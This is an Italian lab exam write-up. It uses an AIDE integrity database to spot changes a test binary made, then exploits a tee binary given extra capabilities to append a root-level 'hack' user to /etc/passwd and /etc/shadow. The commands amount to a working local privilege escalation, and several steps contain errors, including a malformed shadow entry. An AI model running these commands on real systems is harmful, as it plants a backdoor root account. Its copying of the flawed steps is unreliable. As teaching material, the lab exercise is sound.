## esame 11 gennaio 24 AIDE e PRIVESC

---Obbiettivo:

Scaricare sulla VM Kali il file change4 e renderlo eseguibile
Il comando apporta modifiche a file dentro /usr/bin e /etc

ideare un modo di identificare il file modificato e il tipo di modifica apportata.

usate come utente kali senza sudo il file (o i file) modificato dal comando change4 che ritenete utili per inserire nei file in /etc/passwd ed /etc/shadow le righe opportune per "creare" un utente di nome hack con privilegi di root e password hack (ricordate che esistono le man page)

da kali diventate hack e lanciate id
----------------------

#### FASE 1 ######

1) creo una cartella con la mia configurazione

--# mkdir /home/kali/aide
--# cd /home/kali/aide
--# nano aide.conf
-------------------------///////
# Databases Path

database=file:/home/kali/aide/aide.db
database_out=file:/home/kali/aide/aide.db.new
database_new=file:/home/kali/aide/aide.db.new

# Set your own AIDE rule

RULE=R+rmd160+sha256

# Direc/files to monitor with rules

/usr/bin RULE
/etc RULE

# Dir to ignore
!/bin
!/boot
!/dev
!/home
!/lib
!/lib64
!/media
!/mnt
!/opt
!/proc
!/root
!/run
!/sbin
!/srv
!/sys
!/tmp
!/var
-------------------------///////


2) reinizializzo il database con la nuova configurazione

--# aide -c /home/kali/aide/aide.conf -i
--# cp /home/kali/aide.db{.new,}

3) lancio il comando e poi il confronto con aide
--# sudo ./change1
--# aide -c /home/kali/aide/aide.conf -C

##### FASE 2 #############

Il risultato del controllo mostra come il file change4 abbia apportato modifiche al file /etc/sudoers (ACL), /usr/bin/grep (capabilities), /usr/bin/tee (capabilities) e /usr/bin/vim.tiny (rimozione del diritto di scrittura per l'utente)

L'unico comando che posso sfruttare Ã¨ tee:

	echo "hack:x:10000:1:hack:/root:/bin/bash" | tee -a /etc/passwd

Per codificare la password "hack":

[codifico il salt]
	openssl rand -base64 32

[codifico la password con il salt]
	openssl passwd -6 -salt mqn8xWt4j5pjMVxh66RmfPWQtLrrVphcI8aXI/iNzoY= hack

[aggiungo la password ad etc shadow]
	echo "hack:mqn8xWt4j5pjMVxh66RmfPWQtLrrVphcI8aXI/iNzoY= hack
$6$mqn8xWt4j5pjMVxh$7jvaiqFpR3uJPox0muNyShei.4kUFE0atuNKdw4YpkSXYu2FNqCxqFg0RJdMnbmCHbjQmqf0BCPdE4..NNLJs.:::::::" | tee -a /etc/shadow

--------

	sudo -i hack
	[password:] hack
	# id
